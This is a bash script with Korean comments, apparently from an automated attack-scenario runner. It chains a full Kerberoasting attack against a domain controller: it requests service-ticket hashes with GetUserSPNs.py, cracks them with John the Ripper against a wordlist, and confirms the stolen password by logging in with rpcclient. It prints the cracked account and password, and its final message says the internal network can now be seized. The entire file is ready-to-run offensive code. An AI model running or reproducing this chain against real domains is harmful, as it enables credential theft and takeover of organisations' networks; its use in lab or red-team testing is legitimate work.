#!/usr/bin/env bash
set -eu

RUN_ID="${1:-run-manual}"
PARAMS_JSON="${2:-}"
if [ -z "$PARAMS_JSON" ]; then
  PARAMS_JSON='{}'
fi

# 1. 환경 변수 및 경로 설정
VENV_PYTHON="/home/ubuntu/attack-runner/venv/bin/python3"
ATTACK_EXE="/home/ubuntu/attack-runner/venv/bin/GetUserSPNs.py"
JOHN_EXE="/home/ubuntu/john/run/john"
WORDLIST="/home/ubuntu/attack-runner/scenarios/pass.txt"
TMP_HASH_FILE="/tmp/kerberoast_hash_${RUN_ID}.txt"

get_param() {
  local key="$1"
  local default_value="${2:-}"
  "$VENV_PYTHON" - "$PARAMS_JSON" "$key" "$default_value" <<'PY'
import json
import sys
raw = sys.argv[1]
key = sys.argv[2]
default_value = sys.argv[3]
try:
    data = json.loads(raw)
    value = data.get(key, default_value)
    print(value if value is not None else "")
except:
    print(default_value)
PY
}

TARGET_IP="$(get_param target_ip)"
DOMAIN_NAME="$(get_param domain_name)"
ATTACKER_USER="$(get_param attacker_user)"
ATTACKER_PASS="$(get_param attacker_pass)"

# ==========================================
# [STEP 1] Kerberoasting 서비스 티켓(TGS) 해시 탈취
# ==========================================
echo "[INFO] 1단계: Kerberoasting 공격 시작..."
echo "[INFO] 인증 계정: $ATTACKER_USER @ $DOMAIN_NAME"
echo "[INFO] 대상 DC IP: $TARGET_IP"

set +e
RAW_OUTPUT=$("$VENV_PYTHON" "$ATTACK_EXE" "${DOMAIN_NAME}/${ATTACKER_USER}:${ATTACKER_PASS}" -dc-ip "${TARGET_IP}" -request 2>&1)
RC=$?
set -e

if [ $RC -eq 0 ] && [[ "$RAW_OUTPUT" == *"\$krb5tgs\$"* ]]; then
    HASH_VALUE=$(echo "$RAW_OUTPUT" | grep -oP '\$krb5tgs\$.*')
    echo "$HASH_VALUE" > "$TMP_HASH_FILE"
    CRACKED_USER=$(echo "$HASH_VALUE" | cut -d'*' -f2 | cut -d'$' -f1)
    echo "[SUCCESS] 서비스 티켓 해시 탈취 성공!"
else
    echo "[FAILURE] 해시 탈취 실패 또는 SPN이 등록된 취약한 계정이 없습니다."
    echo "[DEBUG] 서버 응답 메시지: $RAW_OUTPUT"
    exit 1
fi

# ==========================================
# [STEP 2] John the Ripper 오프라인 크래킹
# ==========================================
echo ""
echo "[INFO] 2단계: John the Ripper를 이용한 패스워드 크래킹 시작..."

set +e
"$JOHN_EXE" --wordlist="$WORDLIST" "$TMP_HASH_FILE" > /dev/null 2>&1
set -e

CRACK_RESULT=$("$JOHN_EXE" "$TMP_HASH_FILE" --show 2>/dev/null | grep ":" | head -n 1 || true)

if [[ "$CRACK_RESULT" == *":"* ]]; then
    CRACKED_PASS="${CRACK_RESULT#*:}"
    echo "[SUCCESS] 비밀번호 크래킹 성공!"
    echo " ↳ 탈취한 대상 계정: $CRACKED_USER"
    echo " ↳ 암호: $CRACKED_PASS"
else
    echo "[FAILURE] 사전 파일($WORDLIST)에서 비밀번호를 찾지 못했습니다."
    rm -f "$TMP_HASH_FILE"
    exit 1
fi

# ==========================================
# [STEP 3] 획득한 자격 증명으로 로그인 검증
# ==========================================
echo ""
echo "[INFO] 3단계: 탈취한 크리덴셜로 로그인(RPC) 시도 중..."

set +e
LOGIN_OUTPUT=$(rpcclient -U "${DOMAIN_NAME}\\${CRACKED_USER}%${CRACKED_PASS}" -c "getusername;quit" "${TARGET_IP}" 2>&1)
LOGIN_RC=$?
set -e

echo "--------------------------------------------------"
if [ $LOGIN_RC -eq 0 ]; then
    echo "[SUCCESS] 타겟 서버($TARGET_IP) 인증 완벽 성공!"
    echo " ↳ 확인된 도메인 유저: $LOGIN_OUTPUT"
    echo " ↳ 이제 $CRACKED_USER 계정 권한으로 내부망을 장악할 수 있습니다."
else
    echo "[WARNING] 인증 실패 혹은 RPC 접근 불가"
    echo " ↳ 서버 응답: $LOGIN_OUTPUT"
fi
echo "--------------------------------------------------"

rm -f "$TMP_HASH_FILE"